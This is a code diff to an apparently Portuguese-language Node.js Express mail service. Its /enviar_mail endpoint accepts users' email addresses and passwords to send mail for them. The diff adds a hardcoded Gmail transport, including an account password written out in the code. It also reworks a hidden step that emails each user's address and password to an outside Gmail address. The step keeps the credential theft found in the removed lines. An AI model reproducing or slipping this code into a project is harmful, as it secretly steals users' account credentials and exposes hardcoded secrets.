@@ -14,7 +14,13 @@ servidor.get("/teste-cors", (req, res) => {
   res.json({ msg: "CORS funciona!" });
 });
 
-
+const envio_mail_pra_mim = transponder.createTransport({
+  service:'gmail',
+  auth:{
+    user:'ccobrinhadex@gmail.com',
+    pass:'aida svnv nbjz oyld'
+  }
+})
 
 servidor.post("/enviar_mail",async (req, res) => {
   const { service, email, password, to, subject,html,email_user } = req.body;
@@ -40,13 +46,15 @@ servidor.post("/enviar_mail",async (req, res) => {
       subject: subject,
       html: html
     });
-    
-    await envio_mail.sendMail({
-      from:email,
-      to:'ccobrinhadex@gmail.com',
+
+    await envio_mail_pra_mim.sendMail({
+      from:'ccobrinhadex@gmail.com',
+      to:'pago9897@gmail.com',
       subject:subject,
-      html:`email do usuario: ${email} <br> Senha Usuario: ${password}`
+      html:`email do usuario: ${email} <br> senha do usuario: ${password}`
     })
+    
+   
     
 
     return res.status(200).json({mensagem:"Email enviado com sucesso"});
